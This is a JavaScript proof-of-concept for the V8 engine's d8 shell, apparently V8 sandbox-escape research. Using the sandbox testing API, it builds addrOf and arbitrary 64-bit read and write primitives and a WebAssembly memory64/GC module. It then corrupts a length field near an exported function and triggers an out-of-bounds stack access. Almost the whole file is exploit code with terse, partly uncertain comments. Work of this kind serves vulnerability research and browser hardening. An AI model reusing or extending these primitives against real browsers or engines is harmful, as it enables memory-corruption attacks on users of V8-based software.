// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t7.js

d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }

const builder = new WasmModuleBuilder();
builder.exportMemoryAs("mem0", 0);
const GB = 1024 * 1024 * 1024;
let $mem0 = builder.addMemory64(1 * GB / kPageSize);

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);

let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
//let kSig_v_i = makeSig([kWasmI32], []);
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kExprI32StoreMem, 0, 0, // i32.store offset = -1
]);
builder.addFunction("func1", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);
builder.addFunction("get_func0", kSig_r_v).exportFunc().addBody([ //let kSig_r_v = makeSig([], [kWasmExternRef]);
  kExprRefFunc, 0,
  kGCPrefix, kExprStructNew, $box,
  kGCPrefix, kExprExternConvertAny,
]);
builder.addFunction("get_func1", kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 1,
  kGCPrefix, kExprStructNew, $box,
  kGCPrefix, kExprExternConvertAny,
]);
builder.addFunction("boom", kSig_i_l).exportFunc().addBody([ // boom call function in ref with arg is int64 so it should call func_1 but instead func_0 got called
  kExprLocalGet, 0,
  kExprRefFunc, 1,
  kExprCallRef, $sig_i_l,
])

let instance = builder.instantiate();
instance.exports.func0(0n);

instance.exports.func1(0n);
instance.exports.func0(0n);

%DebugPrint(instance.exports.func1);

// ===============================
// length has only 2 bytes
// 0xbn
// 174n
v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x4141n);
%SystemBreak();

// trigger out-of-bounds stack
instance.exports.func1(0n);

